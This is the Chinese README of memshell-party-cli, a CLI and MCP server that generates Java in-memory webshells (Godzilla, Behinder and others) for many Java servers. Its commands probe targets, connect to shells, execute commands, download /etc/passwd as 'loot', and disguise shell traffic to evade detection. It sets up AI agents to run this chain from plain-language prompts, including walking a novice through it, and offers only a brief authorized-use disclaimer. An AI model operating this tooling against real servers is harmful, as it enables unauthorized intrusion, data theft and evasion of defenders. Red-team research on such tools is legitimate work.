# memshell-party-cli

[English](README.en.md) | 中文

[MemShellParty](https://party.mem.mk) 的命令行客户端 + MCP 服务器：生成 Java 内存马、探测目标、连马验证、执行命令、传输文件。设计给 AI 代理(Claude Code 等)用自然语言操作，也可以自己当普通命令行敲。

> ⚠️ 仅限授权安全测试、红队演练与研究。请勿用于未授权目标，后果自负。

## 它能做什么

| 能力 | 说明 |
|------|------|
| **生成内存马** | 约 17 种中间件/框架（Tomcat、Jetty、JBoss、WebLogic、SpringWebMvc、Undertow、Resin、Struts2…），9 种工具（哥斯拉、冰蝎、蚁剑、Command、suo5、NeoreGeorg、Proxy、自定义 class），Listener/Filter/Servlet/Agent 等多种挂载方式，60+ 种打包器（Base64、JSP、反序列化链、SpEL/OGNL 表达式注入、AgentJar…） |
| **盲探测 probe** | 不知道目标是什么中间件时，先用 DNSLog / Sleep / 回显探测服务器类型和 JDK 版本 |
| **连马验证 connect** | 用真实协议握手验证马是否存活、密码对不对（哥斯拉/冰蝎/suo5/mimic） |
| **执行命令 exec** | 在已部署的哥斯拉/冰蝎马上执行命令，自动识别 Windows/Linux |
| **传文件 upload/download** | 大文件自动分块，传完校验完整性（哥斯拉比大小、冰蝎比 MD5） |
| **目标管理 save/list** | 把马保存成"项目/名字"，以后 `memparty exec web1 --cmd whoami` 不用再敲一长串参数 |
| **操作日志 log** | 每次操作自动记录到本地文件，不记录密码和文件内容 |
| **流量伪装 mimic** | 手写一份站点 profile，让马的流量长得和目标站点的正常页面一样 |
| **交互模式** | 直接敲 `memparty` 进入 REPL；`memparty gen` 进入向导，按菜单选 |

所有生成的马都带一个认证 header（在 `gen --json` 的输出里），别人扫到 URL 也用不了你的马。

## 两种用法

1. **让 AI 用（推荐）** — 装上配套 skill / MCP 后，直接用大白话指挥 AI，它负责选参数、敲命令、处理报错。
2. **自己敲命令** — 完整的 CLI，每个选项都有对应参数，可脚本化；`--json` 输出方便集成。

## 快速上手：让 AI 帮你操作

### 第 1 步：安装本工具

1. 电脑装好 [Node.js](https://nodejs.org/)（选 LTS，18 或更新）
2. 打开终端，复制粘贴：

```bash
npm install -g memshell-party-cli
```

3. 检查是否成功：

```bash
memparty version
```

能看到版本号就 OK。

### 第 2 步：把使用手册教给 AI（Skill）

Skill 是给 AI 看的完整说明书。装好后，AI 会按手册一步步操作，不用你懂技术。

**用 Claude Code 的，执行：**

```bash
memparty skill install --claude
```

**用别的 AI 代理的，执行：**

```bash
memparty skill install
```

**两个都想装：**

```bash
memparty skill install --user --claude
```

装完后**重启一下你的 AI 工具**（关掉再打开），它才会读到新 skill。

以后升级了本工具，再跑一遍上面的安装命令，就能刷新说明书。

### 第 3 步：给 AI 接上 MCP（可选，但推荐）

让 AI 能直接调用本工具。在 AI 的 MCP 配置里加上：

```json
{
  "mcpServers": {
    "memshell-party": {
      "command": "npx",
      "args": ["-y", "memshell-party-cli", "mcp"]
    }
  }
}
```

保存后重启 AI。

### 第 4 步：直接对 AI 说话

**先确认 skill 在不在（推荐每次新开对话先说这句）：**

```text
请先读取 memshell-party 这个 skill，然后严格按 skill 里的步骤操作，不要自己瞎猜参数。
```

**生成一个马：**

```text
请按 memshell-party skill，帮我生成一个常用的 Tomcat 哥斯拉内存马。
把文件、密码、密钥都给我，并用简单话告诉我下一步怎么做。
```

**连上马并执行命令：**

```text
请按 memshell-party skill 操作。
网址：【http://这里换成你的地址】
类型：哥斯拉，密码：【pass】，密钥：【key】。
先测能不能连上，连上后执行 whoami，用简单话告诉我结果。
```

**传文件：**

```text
请按 memshell-party skill。
在已经连上的马上：
下载服务器上的【/etc/passwd】到本地；
上传本地【工具.exe】到服务器【/tmp/工具.exe】。
```

**我完全不懂，你带我：**

```text
我是小白。请先读取 memshell-party skill，然后一步一步带我：
1. 生成一个常用的 Tomcat 哥斯拉内存马
2. 用大白话告诉我生成结果里哪些要保存
3. 我部署好后把网址发给你，你帮我连上并执行命令
每一步先说明要做什么，等我确认再继续。只在我授权的环境操作。
```

## 快速上手：自己敲命令

命令一览：

| 命令 | 干什么 |
|------|--------|
| `memparty gen` | 生成内存马（不带参数进入交互向导） |
| `memparty probe` | 生成探测马，盲测目标中间件/JDK |
| `memparty connect` | 验证马是否存活、凭据对不对 |
| `memparty exec` | 在马上执行命令 |
| `memparty upload` / `download` | 通过马上传/下载文件 |
| `memparty save` / `list` / `note` / `remove` | 保存目标、按名字管理 |
| `memparty log` | 查操作日志 |
| `memparty config` | 查后端支持的中间件/工具/打包器 |
| `memparty profile` / `custom build` / `demo` | mimic 流量伪装：写站点画像、构建自定义马、本地演示 |
| `memparty skill install` | 给 AI 装使用手册 |
| `memparty mcp` | 启动 MCP 服务器 |
| `memparty parse-classname` | 解析 .class 的类名 |
| `memparty version` | 查看 CLI 和后端版本 |

典型流程：

```bash
# 1. 生成一个 Tomcat 哥斯拉马（Listener 型，base64 输出，自动解码写成 .class）
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class

# 2. 部署后验证是否存活（header 值在 gen --json 的输出里）
memparty connect -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 3. 存成名字，以后不用敲参数
memparty save web1 -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 4. 执行命令、传文件
memparty exec web1 --cmd "whoami"
memparty download web1 /etc/passwd -o loot/passwd
```

生成时的两个细节：

- `-o` 和 `--json` 可以同时用：文件照常写盘，JSON 里多一个 `outputFile` 字段（路径、大小、是否解码）。
- 聚合 packer（如 `Base64`，一次返回多个变体）不能配 `-o`，会报错提示你换成叶子 packer（如 `DefaultBase64`）。
- 走 MCP 时，`generate_memshell` / `generate_probe` 有个 `outputFile` 参数，效果同上。

拿不准有哪些合法取值，直接问后端（这些名字就是参数里要填的值）：

```bash
memparty config servers          # 支持哪些中间件
memparty config tools Tomcat     # 这个中间件支持哪些工具和挂载类型
memparty config packers          # 打包器列表（按投放方式选）
```

每个命令都能加 `--help` 看详细参数和例子；完整参数参考见 [英文 README](README.en.md)。

## 后端：真实测试建议自建

默认用公共站 `https://party.mem.mk`，试用没问题；但真实测试别把 payload 交给公共服务——建议用 Docker 自建（见 MemShellParty 的 README），然后：

```bash
memparty --api http://127.0.0.1:8080 gen
# 或设环境变量，一劳永逸
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

优先级：`--api` 参数 > `MEMPARTY_API_URL` 环境变量 > `~/.mempartyrc` 配置文件 > 默认公共站。

## 更多文档

- [mimic 自定义内存马实战指南](docs/mimic-memshell-guide.md) — 流量伪装端到端实战（人读版）
- [自定义内存马设计方案](docs/custom-memshell-design.md) — mimic 的设计文档
- [README.en.md](README.en.md) — 完整英文参考（全部命令、参数、MCP 工具、API 调用）
- [skills/memshell-party/SKILL.md](skills/memshell-party/SKILL.md) — 给 AI 的操作手册，人想深入细节也可以读

## 开发

```bash
npm install
npm run build       # tsup -> dist/
npm test            # vitest
npm run typecheck   # tsc --noEmit
```

## 许可证

MIT
